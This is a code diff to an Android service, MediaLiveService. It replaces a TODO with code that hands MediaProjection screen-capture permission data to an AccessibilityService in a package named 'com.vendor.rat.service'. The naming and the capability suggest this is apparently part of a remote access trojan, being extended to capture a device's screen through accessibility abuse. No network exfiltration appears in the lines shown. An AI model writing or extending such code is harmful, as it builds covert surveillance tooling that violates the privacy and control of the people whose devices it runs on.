@@ -36,12 +36,21 @@ public class MediaLiveService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (intent != null) {
-            int code = intent.getIntExtra("code", -1);
+            int code = intent.getIntExtra("code", Integer.MIN_VALUE);
             Intent data = intent.getParcelableExtra("data");
+            Log.d(TAG, "onStartCommand: code=" + code + ", data=" + (data != null ? "present" : "null"));
 
-            if (code != -1 && data != null) {
-                // TODO: 初始化 MediaProjection 截图能力
-                Log.d(TAG, "MediaProjection initialized");
+            if (code != Integer.MIN_VALUE && data != null) {
+                com.vendor.rat.service.MyAccessibilityService service =
+                    com.vendor.rat.service.MyAccessibilityService.P();
+                if (service != null) {
+                    service.initMediaProjection(code, data);
+                    Log.d(TAG, "MediaProjection initialized via AccessibilityService");
+                } else {
+                    Log.w(TAG, "AccessibilityService not available for MediaProjection init");
+                }
+            } else {
+                Log.w(TAG, "Missing code or data for MediaProjection: code=" + code);
             }
         }
 
